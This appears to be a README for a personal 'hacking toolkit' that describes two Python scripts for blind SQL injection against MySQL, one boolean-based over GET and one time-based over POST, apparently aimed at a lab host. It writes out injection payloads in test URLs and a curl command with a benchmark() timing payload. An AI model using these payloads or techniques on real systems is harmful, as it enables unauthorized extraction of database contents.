# hacking_toolkit

**requirements:**

* Python 3
* python-requests


## SQL Injection

Works on MySQL >= 5.

### blind_get_list_data.py
* Requires a vulnerable url with get param, and an expected string from normal result
* Uses bitwise operations to retrieve a character in 8 requests.

An url is vulnerable to this exploit if:

* Normal request `http://172.28.128.3:8007/membre.php?id=7` returns results
* Request `http://172.28.128.3:8007/membre.php?id=7' and 1='1` also
  returns results.
* But request `http://172.28.128.3:8007/membre.php?id=7' and 1='0`
  doesn't return any results.

This allows us to ask many yes/no questions to MySQL, and figure out table
names, columns names and data.


### blind_post_list_data.py
* Requires an url with vulnerable form, and its keys
* Uses bitwise operations to retrieve a character in 8 requests.

An url is vulnerable to this exploit if:

* a normal request is executed in some time, here **0.005s**

    $ time curl -d user_name="" -d password="" http://172.28.128.3:8009/validate.php &> /dev/null
    0.00s user 0.00s system 70% cpu 0.005 total

* the exploit takes much longer to return a result, here **1.5s**

    $ time curl -d user_name="' and if(1=1, benchmark(5000000,md5(char(1))),null)#" -d password="" http://172.28.128.3:8009/validate.php &> /dev/null
    0.00s user 0.00s system 0% cpu 1.505 total

This is the same principle as `blind_get_list_data.py`, except it's a post
request and we check the result by monitoring the execution time of the page
